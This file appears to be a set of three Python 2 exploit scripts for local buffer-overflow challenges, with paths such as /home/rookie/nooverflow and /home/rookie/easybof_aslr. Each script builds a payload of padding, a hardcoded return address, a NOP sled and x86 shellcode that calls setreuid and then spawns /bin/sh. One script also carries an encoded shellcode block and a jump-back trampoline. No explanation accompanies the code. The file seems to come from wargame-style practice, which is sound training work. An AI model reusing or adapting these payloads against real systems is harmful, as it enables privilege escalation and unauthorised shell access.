#!/usr/bin/env python2
import struct
shellcode = "\x31\xC0\xB0\x31\xCD\x80\x89\xC3\x89\xC1\x31\xC0\xB0\x46\xCD\x80" # setreuid
shellcode += "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" # drop shell

eip = struct.pack("<I", 0xbffff4c0)

print "%s%s%s%s"%("A"*140, eip, "\x90"*2000, shellcode)

##################################################################################################################3

#!/usr/bin/env python2
import struct
import os
shellcode = "\x90"*1000                                                                      
shellcode += "\x31\xC0\xB0\x31\xCD\x80\x89\xC3\x89\xC1\x31\xC0\xB0\x46\xCD\x80" # setreuid   
shellcode += "\x31\xc0\xb0\x04\x04\x07\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" # drop shell                                                      
                                                                                             
# malloc heap address:  0x804a008                                                            
# got.free:             0x80499d0                                                            
                                                                                                                                                                                          
                                                                                                                                                                                          offset = -398                                                                                

                                                                                                                                                                                          eip = struct.pack("<I", 0xbffff9e6)

#os.environ['shellcode'] = shellcode
os.system("/bin/bash -c '/home/rookie/nooverflow/nooverflow %d %s %s'"%(offset, eip, shellcode))
#os.system('/bin/bash')



##################################################################################################################3

import os
import struct

eip = struct.pack("<I", 0x8048467)

buf  = "\x31\xC0\xB0\x31\xCD\x80\x89\xC3\x89\xC1\x31\xC0\xB0\x46\xCD\x80" # setreuid
buf += "\x89\xe5\xdb\xcd\xd9\x75\xf4\x59\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37"
buf += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x52\x4a\x66\x6b\x32\x78"
buf += "\x6e\x79\x62\x72\x53\x56\x45\x38\x34\x6d\x50\x63\x6e"
buf += "\x69\x79\x77\x71\x78\x76\x4f\x31\x63\x62\x48\x67\x70"
buf += "\x35\x38\x46\x4f\x63\x52\x35\x39\x70\x6e\x4e\x69\x79"
buf += "\x73\x62\x72\x78\x68\x43\x38\x43\x30\x73\x30\x33\x30"
buf += "\x56\x4f\x31\x72\x61\x79\x70\x6e\x64\x6f\x32\x53\x75"
buf += "\x38\x57\x70\x70\x57\x32\x73\x6c\x49\x79\x71\x7a\x6d"
buf += "\x6d\x50\x41\x41"

jumper = "\xe9\x01\xff\xff\xff"
nop = "\x90"*(20 - len(jumper))

# start jumper  0xffab9458
# start arg 2   0xffab9688
payload = nop + jumper + eip
#os.system("/bin/bash -c '/home/rookie/easybof_aslr/easybof %s'"%payload)
print(payload + " " + "a"*100)



